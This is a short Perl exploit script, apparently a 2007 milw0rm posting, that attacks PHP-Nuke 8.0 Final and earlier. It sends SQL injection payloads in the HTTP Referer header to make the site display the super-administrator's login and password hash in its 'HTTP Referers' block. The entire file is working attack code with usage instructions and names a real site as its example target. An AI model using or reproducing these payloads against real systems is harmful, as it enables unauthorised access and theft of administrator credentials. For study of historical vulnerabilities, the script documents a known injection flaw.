#!/usr/bin/perl 
#0day exploit for PHP-nuke <=8.0 Final
#Sql injection attack in INSERT syntax
#version, when 'HTTP Referers' block is on
#Coded by:Maciej `krasza` Kukla[krasza@gmail.com]
#Screenshot:
#0day exploit for PHP-nuke <=8.0 Final
#Sql injection attack in INSERT syntax
#version, when 'HTTP Referers' block is on
#Coded by:Maciej `krasza` Kukla[krasza@gmail.com]
#
#[+]You can see login and hash on web page in 'HTTP referers' block
#[+]Exploit successed
use strict;
use warnings;
use LWP;
my $adres=shift or help();
my $ua = LWP::UserAgent->new;
my $zadanie = HTTP::Request->new(GET => $adres);
my ($respone,$referer);
banner();
	$referer="http://www.krasza.int.pl'),(NULL,(SELECT `pwd` FROM `nuke_authors` WHERE `radminsuper`=1))/*";
	$zadanie->referer($referer);
	$respone=$ua->request($zadanie);
	$respone->is_success or die "$adres : ",$respone->message,"\n";
        $referer="http://www.krasza.int.pl'),(NULL,(SELECT `aid` FROM `nuke_authors` WHERE `radminsuper`=1))/*";
	$zadanie->referer($referer);
	$respone=$ua->request($zadanie);
        $respone->is_success or die "$adres : ",$respone->message,"\n";
	print "[+]You can see login and hash on web page in 'HTTP referers' block\n";
	print "[+]Exploit successed\n";
sub banner{
	print "0day exploit for PHP-nuke <=8.0 Final\n";
        print "Sql injection attack in INSERT syntax\n";
	print "version, when 'HTTP Referers' block is on\n";
        print "Coded by:Maciej `krasza` Kukla[krasza\@gmail.com]\n\n";
}
sub help{
	print "0day exploit for PHP-nuke <=8.0 Final\n";
	print "Sql injection attack in INSERT syntax\n";
	print "version, when 'HTTP Referers' block is on\n";
	print "Coded by:Maciej `krasza` Kukla[krasza\@gmail.com]\n";
	print "Use:\n";
	print "\tperl exploit.pl [url]\n";
	print "\t[url]-vicitim webpage with index.php\n";
	print "Example:\n";
	print "\tperl exploit.pl http://phpnuke.org/index.php\n";
	exit(0);
}

# milw0rm.com [2007-02-20]
